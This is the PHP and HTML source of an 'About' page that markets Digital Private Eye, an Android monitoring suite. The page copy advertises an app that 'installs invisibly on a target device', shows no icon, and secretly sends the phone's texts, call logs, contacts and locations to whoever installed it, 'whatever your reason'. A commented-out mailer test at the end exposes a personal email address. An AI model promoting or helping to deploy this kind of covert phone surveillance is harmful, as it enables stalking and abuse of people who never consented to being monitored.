<?php
CONST APPLICATION_INITIALS = 'DPEye';
CONST APPLICATION_WEBSITE = 'http://digitalprivateeye.com';
CONST APPLICATION_NAME = 'Digital Private Eye';
CONST APPLICATION_DOWNLOAD_URL = 'https://play.google.com/store/apps/details?id=com.phonedatasaver';
CONST OWNER = 'Made Software Ltd';
CONST FACEBOOK_URL = 'https://www.facebook.com/pages/Digital-Private-Eye/703312569701920';
CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>About -  <?=APPLICATION_NAME;?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Le styles -->
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
    <!--[if IE 7]>
      <link rel="stylesheet" href="css/font-awesome-ie7.min.css">
    <![endif]-->
    <link rel="stylesheet" type="text/css" href="css/style.css" />

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- iconv and touch icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/sample/logo-144.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/sample/logo-114.png">
      <link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/sample/logo-72.png">
                    <link rel="apple-touch-icon-precomposed" href="img/sample/logo-57.png">
                                   <link rel="shortcut icon" href="../img/sample/logo.png">

  </head>

  <body>


  <?php
  include "nav.php";
  ?>

    <div class="clear"></div>
    
    <div class="container-wrapper container-top container-wrapper-sky">
      <div class="container container-top">
        <div class="row">
          <div class="col-md-12 center">
            <h1>About Digital Private Eye</h1>
          </div><!-- end col -->
        </div><!-- end row -->
      </div><!-- end container -->
    </div><!-- end container wrapper -->
    
    <div class="container">
      
      <div class="row">
          <div class="col-md-7 col-md-offset-1">
              <p>

<form action="/webformmailer.php" method="post">
<input type="hidden" name="subject" value="Submission" />
<input type="hidden" name="redirect" value="thankyou.html" />
First Name: <input type="text" name="FirstName" />
Last Name :<input type="text" name="LastName" />
Email: <input type="text" name="email" />
Comments: <textarea name="comments" cols="40" rows="10">
Type comments here.</textarea>
<input type="submit" name="submit" value="submit"/>
<input type="hidden" name="form_order" value="alpha"/>
<input type="hidden" name="form_delivery" value="hourly_digest"/>
<input type="hidden" name="form_format" value="html"/>
</form>
                  Digital Private Eye is a suite of software products that empowers you to find the answers you want.
                  Our cell phone monitoring software secretly tracks all cell phone activities and sends the information back to your
                  Digital Private Eye's user account.
              </p>
              <p>
                  Our software suite currently includes;
              </p>
              <p>
                  <ul style="margin-left: 30px;">
                      <li>Digital Private Eye - Spy (For Android)</li>
                      <li>Digital Private Eye - Viewer (For Android)</li>
                      <li>Digital Private Eye - Website</li>
                  </ul>
              </p>
              <div id="spy"></br></br>
                <h2><a href="https://play.google.com/store/apps/details?id=com.phonedatasaver" target="_blank" >Digital Private Eye - Spy (For Android)</a></h2>
              <p>
                  Install DPEye on any supported Android phone and you can view it's texts, call logs, contacts and
                  recent locations through our website or using DPEye Viewer app. Digital Private Eye - Spy installs invisibly on a target device. i.e.
                  the device displays no icon or name on the target phone.
              </p>
              <p>
                  Once the app is installed on the device, you will need to register it with YOUR email address. A link to verify this email address
                  will be sent to your email address which you must click in order for the device to begin capturing data.
              </p>
              <p>
                  NOTE - The target phone MUST HAVE internet (WIFI or from an ISP) in order for data to be captured. Data capture will resume when there is internet access available on the phone.
              </p>
	     <p><a class="btn btn-lg btn-success" href="https://play.google.com/store/apps/details?id=com.phonedatasaver" target="_blank" >Download Now</a></p>
          </div>
          <!--
            <div id="viewer"></br></br>
                <h2><a href="https://play.google.com/store/apps/details?id=com.digitalprivateeyeclient" target="_blank" >Digital Private Eye - Viewer (For Android)</a></h2>
              <p>
                  Digital Private Eye - Viewer provides a convenient way to view data for all your bugged devices from the convenience of you phone. Simply install on your phone and register with the same email address you used to register your bugged devices.
              </p>
	      <p><a class="btn btn-lg red" href="https://play.google.com/store/apps/details?id=com.digitalprivateeyespy" target="_blank" >Download Now</a></p>
          </div>
          -->
              <div id="site"></br></br>
                  <h2><a href="index.php" >Digital Private Eye - Website</a></h2>
              <p>
                  Digital Private Eye - Website allows you to view data from all your bugged devices using a web browser. This is particularly convenient for users without an android phone. It is also handy for downloading device data as a PDF document.
              </p>
	      <p><a class="btn btn-lg btn-yellow" href="registration.php" target="_blank" >Register Now</a></p>
          </div>
              <div id="site"></br></br>
                  <h2><a href="index.php" >Why Digital Private Eye?</a></h2>
              <p>
                  Whatever your reason for wanting to discreetly monitor a cell phone activity, Digital Private Eye is your comprehensive and cost-effective solution.
              </p>
              <p>
                  We offer a free trial for all newly registered devices. We also regularly give away free subscriptions to our customers. 
              </p>
              <p>
                  Like us on facebook to get a free 2 day coupon.
		<div class="fb-like" data-href="https://www.facebook.com/pages/Digital-Private-Eye/703312569701920" data-layout="standard" data-action="like" data-show-faces="true" data-share="true"></div>
		</p>
<p></br></br></br></p>
          </div>              
        </div><!-- end col -->
        <div class="col-md-3 col-md-offset-1 sidebar">
            <?php include "quick-links.php"; ?>
        </div><!-- end col -->
      </div><!-- end row -->
  
    </div> <!-- end container -->

    <div class="clear"></div>


  <?php
  include "footer.php";
  ?>

    <!-- Le javascript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load iconster -->

    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/zion.js"></script>
    <script type="text/javascript">
      $(document).ready(function() {
        $('.dropdown-toggle').dropdown();
        $('[data-toggle=tooltip]').tooltip();
        $('[data-toggle=popover]').popover({html:true});
        $('#myTab a').click(function (e) {
          e.preventdefault();
          $(this).tab('show');
        });
      });
    </script>

  </body>
</html>

/*

include('MailerTest.php');
include('dao.php');


$mailer = new Mailer();



    $receiver = "mosadoluwa.adekunle@yahoo.com";//$message['email_to'];
    $sender = "mosadoluwa.adekunle@yahoo.com";
    $userName = "Sean John";//$message['name'];
    $messageBody = "Don't drop the soap";//$message['message'];
    $timestamp = "walama";

    $body = $messageBody . "\nreceived at " . $timestamp. "\n\nfrom, \n" . $userName . "\n" . $sender;
    $mailer->SendMail("New message from ". $userName, $body, $sender, $userName, $receiver);
   // $dao->setMessageSent($message['id']);
*/
?>

